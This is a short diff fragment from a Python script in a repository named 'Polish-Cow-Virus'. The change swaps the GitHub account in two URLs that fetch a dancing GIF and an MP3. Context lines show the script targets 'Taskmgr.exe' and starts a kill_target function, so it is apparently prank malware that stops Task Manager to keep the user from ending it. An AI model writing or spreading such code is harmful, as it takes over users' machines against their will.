@@ -28,8 +28,8 @@ folder = os.path.dirname(os.path.abspath(__file__))
 gif_path = os.path.join(folder, "{gif_id}.gif")
 mp3_path = os.path.join(folder, "{mp3_id}.mp3")
 
-gif_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/dancing.gif"
-mp3_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/pol.mp3"
+gif_url = "https://github.com/lameman12/Polish-Cow-Virus/raw/refs/heads/main/dancing.gif"
+mp3_url = "https://github.com/lameman12/Polish-Cow-Virus/raw/refs/heads/main/pol.mp3"
 target = "Taskmgr.exe"
 
 def kill_target():
